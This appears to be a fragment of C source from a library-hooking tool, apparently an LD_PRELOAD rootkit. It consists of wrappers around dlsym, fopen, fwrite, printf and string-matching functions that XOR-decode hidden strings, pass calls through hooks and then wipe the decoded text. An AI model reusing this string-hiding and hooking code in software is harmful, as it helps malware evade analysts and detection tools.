static void *xdlsym(void *handle, const char *symbol){
	void *ptr = NULL;
	xor(_symbol, symbol);
	ptr = dlsym(handle, _symbol);
	clean(_symbol);
        return ptr;
}

static FILE *xfopen(const char *path, const char *mode){
	FILE *ret;
	hook(CFOPEN);
	xor(_path, path);
	ret = call(CFOPEN, _path, mode);
	clean(_path);
	return ret;
}

static size_t xfwrite(const char *str, size_t nmemb, FILE *stream){
	size_t ret;
	hook(CFWRITE);
	xor(_str, str);
	ret = (size_t)call(CFWRITE, _str, strlen(_str), nmemb, stream);
	clean(_str);
	return ret;
}

static int xprintf(const char *string){
	int ret;
	xor(_string, string);
	ret = printf("%s\n", _string);
	clean(_string);
	return ret;
}

static int xstrncmp(const char *string, const char *pattern){
	int ret;
	xor(_pattern, pattern);
	ret = strncmp(_pattern, string, strlen(_pattern));
	clean(_pattern);
	return ret;
}

static char *xstrstr(const char *pattern, const char *string){
	char *ret;
	xor(_pattern, pattern);
	ret = strstr(string, _pattern);
	clean(_pattern);
	return ret;
}

static int xfnmatch(const char *pattern, const char *string){
	int ret;
	xor(_pattern, pattern);
	ret = fnmatch(_pattern, string, FNM_PATHNAME);
	clean(_pattern);
	return ret;
}
